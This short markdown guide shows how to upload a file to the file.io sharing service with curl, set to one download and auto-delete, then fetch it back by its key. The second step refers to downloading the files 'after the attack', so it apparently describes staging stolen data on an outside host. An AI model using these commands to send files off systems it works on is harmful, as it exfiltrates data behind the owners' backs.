# Upload files to file.io

1. Run the following curl script and take note of the **KEY** it returns
    ```shell
    $ curl -X 'POST' \
        'https://file.io/' \
        -H 'accept: application/json' \
        -H 'Content-Type: multipart/form-data' \
        -F 'file=@FILE_NAME_GOES_HERE' \
        -F 'expires=DATETIME_IN_ISO8601_FORMAT' \
        -F 'maxDownloads=1' \
        -F 'autoDelete=true'
    ```

    Try to stick to the values above as other values may require you to pay for the service.
        
    Returns:
    ```jsonc
    {
        "success": true,
        "status": 200,
        "id": "f00c8350-38a3-11ed-9c58-b7e8b46498c9",
        "key": "dGic53MOudXn", // <-- KEY
        "path": "/",
        "nodeType": "file",
        "name": "Untitled.game",
        "title": null,
        "description": null,
        "size": 1584,
        "link": "https://file.io/dGic53MOudXn",
        "private": false,
        "expires": "2022-09-21T00:00:00.000Z",
        "downloads": 0,
        "maxDownloads": 1,
        "autoDelete": true,
        "planId": 0,
        "screeningStatus": "pending",
        "mimeType": "application/octet-stream",
        "created": "2022-09-20T05:20:27.640Z",
        "modified": "2022-09-20T05:20:27.640Z"
    }
    ```

2. Download all the files after the attack with the following command
    ```shell
    $ curl -X 'GET' \
        'https://file.io/KEY' \
        -H 'accept: */*' \
        -o 'FILE_NAME_GOES_HERE'
    ```
